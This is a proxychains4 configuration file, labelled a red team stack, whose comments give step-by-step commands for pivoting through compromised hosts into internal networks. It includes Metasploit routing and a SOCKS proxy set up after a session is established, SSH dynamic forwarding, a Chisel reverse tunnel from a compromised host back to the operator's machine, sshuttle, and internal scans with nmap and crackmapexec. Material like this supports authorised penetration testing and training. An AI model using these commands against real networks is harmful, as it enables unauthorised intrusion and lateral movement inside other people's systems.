# proxychains4.conf — Pivoting Configuration
# April 2026 Red Team Stack
# Used when pivoting through compromised hosts to reach internal networks
#
# Usage examples:
#   proxychains4 nmap -sT -p 80,443,22 192.168.1.0/24
#   proxychains4 curl http://internal.target.local
#   proxychains4 crackmapexec smb 10.10.10.0/24
#
# Setup:
#   After getting shell on DMZ host, forward SOCKS5:
#   ssh -D 1080 -N user@compromised-host &
#   Then proxychains4 routes through localhost:1080

# ── Basic Configuration ────────────────────────────────────────
strict_chain        # All proxies in chain must be alive
#dynamic_chain      # Dead proxies are skipped (use for resilience)
#random_chain       # Random order (for obfuscation)
proxy_dns           # Resolve DNS through proxy (important for internal hostnames)
quiet_mode          # Suppress proxychains output

tcp_read_time_out 15000
tcp_connect_time_out 8000

# ── Proxy List ─────────────────────────────────────────────────
# Format: type host port [user pass]
# Types: http, socks4, socks5
#
# Update this section after each pivot:

[ProxyList]
# Default: MSF SOCKS4a proxy (via meterpreter route or post/multi/manage/socks_proxy)
socks4 127.0.0.1 1080

# Alternative: SSH dynamic forwarding
# socks5 127.0.0.1 9050

# Alternative: Chisel SOCKS5 server (for environments without SSH)
# socks5 127.0.0.1 1081

# ── Per-Engagement Setup ───────────────────────────────────────
#
# OPTION 1: Metasploit route + SOCKS proxy
# ─────────────────────────────────────────
# In msfconsole (after session established):
#   route add 192.168.1.0/24 [SESSION_ID]
#   use auxiliary/server/socks_proxy
#   set SRVPORT 1080; set VERSION 4a; run -j
#
# OPTION 2: SSH dynamic forwarding
# ─────────────────────────────────
#   ssh -D 1080 -N -f -i ~/.ssh/id_rsa user@[PIVOT_HOST]
#
# OPTION 3: Chisel (when SSH not available)
# ─────────────────────────────────────────
#   Server (your machine):
#     chisel server -p 8080 --reverse
#   Client (compromised host):
#     chisel client [YOUR_IP]:8080 R:1081:socks
#   Then: socks5 127.0.0.1 1081
#
# OPTION 4: sshuttle (transparent proxy, no proxychains needed)
# ─────────────────────────────────────────────────────────────
#   sshuttle -r user@[PIVOT_HOST] 192.168.1.0/24
#   (All traffic to that subnet auto-routes through pivot)
#   No proxychains4 needed for sshuttle

# ── Notes ──────────────────────────────────────────────────────
# TCP connect scan (-sT) required through proxychains — no SYN scan (-sS)
# UDP scans don't work through SOCKS
# ICMP (ping) doesn't work — use -Pn flag with nmap
# proxychains4 nmap -sT -Pn -p top100 [INTERNAL_RANGE]
